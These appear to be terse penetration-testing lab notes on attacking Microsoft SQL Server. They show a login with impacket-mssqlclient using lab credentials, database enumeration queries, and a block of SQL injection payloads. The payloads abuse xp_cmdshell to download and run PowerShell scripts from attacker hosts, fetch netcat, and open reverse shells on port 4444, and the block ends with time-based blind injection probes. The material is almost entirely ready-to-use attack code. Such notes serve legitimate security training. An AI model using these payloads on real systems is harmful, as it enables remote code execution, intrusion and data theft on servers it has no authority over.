natively integrates into windows ecosystem
builtin command line tool SQLCMD
from kali using impacket-mssqlclient
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;

```
'EXEC xp_cmdshell "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.233:8000/rev.ps1')"; --

EXEC xp_cmdshell "powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168:8000/powercat.ps1');
powercat -c 192.168.45.168 -p 4444 -e powershell" ; --

o' ; exec xp_cmdshell "powershell.exe wget http://192.168.45.240:8000/nc64.exe -OutFile c:\\Users\Public\\nc.exe" ; --

o' ; exec xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.240 4444" ; --

'EXEC xp_cmdshell "powershell Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.241 -Port 4444"; --

'; IF (1=2) WAITFOR DELAY '0:0:10';--

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10';--
```